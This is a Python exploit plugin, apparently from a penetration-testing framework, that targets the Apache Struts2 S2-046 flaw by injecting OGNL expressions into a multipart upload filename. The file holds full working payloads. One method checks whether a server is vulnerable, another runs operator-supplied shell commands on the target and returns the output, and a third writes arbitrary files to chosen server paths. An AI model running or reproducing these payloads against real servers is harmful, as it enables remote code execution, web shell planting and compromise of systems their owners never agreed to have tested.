#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'Struts2-046'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-046'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.url != None:
            prove_poc = '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_vul')).(#res.getWriter().print('struts2_security_vul_str2046')).(#res.getWriter().flush()).(#res.getWriter().close())}\0b'''
            poc_key = "struts2_security_vul_str2046"
            try:
                files = {"test": (prove_poc, "text/plain")}
                res = self.curl('post', self.url , files=files)
                if poc_key in res.headers or poc_key in res.text:
                    self.flag = 1
                    self.req.append({"poc": prove_poc})
                    self.res.append({"info":self.url , "key": "struts2_046"})
            except:
                pass

    def exec(self):
        self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            exec_poc = '''%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='%COMMAND%').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b'''
            headers = {}
            try:
                files = {"test": (exec_poc.replace("%COMMAND%", cmd), "text/plain")}
                r = self.curl('post',self.url , headers=headers, files=files, stream=True).text
                res = ""
                try:
                    for line in r.iter_lines():
                        res += str(line) + '\r\n'
                except:
                    res = str(res)
                self.flag = 1
                self.req.append({"poc": exec_poc})
                self.res.append({"info": res, "key": cmd})
            except:
                pass

    def upload(self):
        self.get_url()
        if self.url != None:
            upload_poc =  '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#filecontent='%FILECONTENT%').(new java.io.BufferedWriter(new java.io.FileWriter('%PATH%')).append(new java.net.URLDecoder().decode(#filecontent,'UTF-8')).close()).(#res.getWriter().print('oko')).(#res.getWriter().print('kok/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}\0b'''
            despath = self.parameter['despath']
            srcpath = self.parameter['srcpath']
            content = self.read_file(srcpath['srcpath'])
            headers =  {}
            try:
                files = {"test": (upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%", content), "text/plain")}
                self.curl('post', self.url , headers=headers, files=files)
                self.flag = 1
                self.req.append({"poc": upload_poc})
                self.res.append({"info": despath, "key": 'upload'})
            except:
                pass
